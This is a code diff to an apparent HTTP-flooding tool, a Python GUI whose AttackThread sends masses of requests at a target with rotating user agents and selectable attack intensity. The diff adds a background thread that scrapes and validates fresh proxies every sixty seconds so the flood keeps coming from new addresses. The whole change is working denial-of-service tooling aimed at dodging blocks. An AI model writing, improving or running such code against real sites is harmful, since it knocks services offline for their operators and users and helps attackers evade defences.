@@ -3,6 +3,7 @@ import os
 import requests
 import random
 import threading
+import time
 from datetime import datetime
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
@@ -150,6 +151,8 @@ class AttackThread(QThread):
         self.attack_mode = attack_mode
         self.use_proxy = use_proxy
         self.proxies = []
+        self.proxy_lock = threading.Lock()
+        self.proxy_refresh_interval = 60
         self.running = True
         self.current_requests_sent = 0
 
@@ -190,6 +193,8 @@ class AttackThread(QThread):
                 self.log_signal.emit(f"{len(self.proxies)} working proxies :3")
             else:
                 self.log_signal.emit("no working proxies found, going direct")
+            refresher = threading.Thread(target=self._proxy_refresher, daemon=True)
+            refresher.start()
 
         if self.attack_mode == "soft":
             workers = 1
@@ -207,10 +212,7 @@ class AttackThread(QThread):
                         break
                     try:
                         headers = {"User-Agent": random.choice(USER_AGENTS)}
-                        if self.use_proxy and self.proxies:
-                            proxy = random.choice(self.proxies)
-                        else:
-                            proxy = None
+                        proxy = self._pick_proxy()
                         self._send(session, headers, proxy)
                         self._count_request()
                     except requests.exceptions.RequestException as e:
@@ -222,10 +224,7 @@ class AttackThread(QThread):
                     if not self.running:
                         break
                     headers = {"User-Agent": random.choice(USER_AGENTS)}
-                    if self.use_proxy and self.proxies:
-                        proxy = random.choice(self.proxies)
-                    else:
-                        proxy = None
+                    proxy = self._pick_proxy()
                     futures.append(executor.submit(self._send, session, headers, proxy))
                     if len(futures) >= batch_target:
                         self._wait_batch(futures)
@@ -239,6 +238,12 @@ class AttackThread(QThread):
         if self.running:
             self.log_signal.emit("~ done! ~")
         self.update_progress.emit(0)
+
+    def _pick_proxy(self):
+        with self.proxy_lock:
+            if self.use_proxy and self.proxies:
+                return random.choice(self.proxies)
+        return None
 
     def _wait_batch(self, futures):
         for fut in as_completed(futures):
@@ -260,6 +265,25 @@ class AttackThread(QThread):
         )
         progress = int((self.current_requests_sent / self.num_requests) * 100)
         self.update_progress.emit(min(progress, 100))
+
+    def _load_proxies(self):
+        """scrape + validate a fresh proxy list and swap it in."""
+        try:
+            proxies = scrape_proxies()
+            proxies = [p for p in proxies if p]
+            valid = filter_proxies(proxies)
+            fresh = [{"http": p, "https": p} for p in valid]
+            with self.proxy_lock:
+                self.proxies = fresh
+            self.log_signal.emit(f"proxies refreshed: {len(fresh)} working")
+        except Exception as e:
+            self.log_signal.emit(f"[error] proxy refresh failed: {e}")
+
+    def _proxy_refresher(self):
+        """periodically re-scrape and re-validate proxies while running."""
+        while self.running:
+            time.sleep(self.proxy_refresh_interval)
+            self._load_proxies()
 
     def stop(self):
         self.running = False
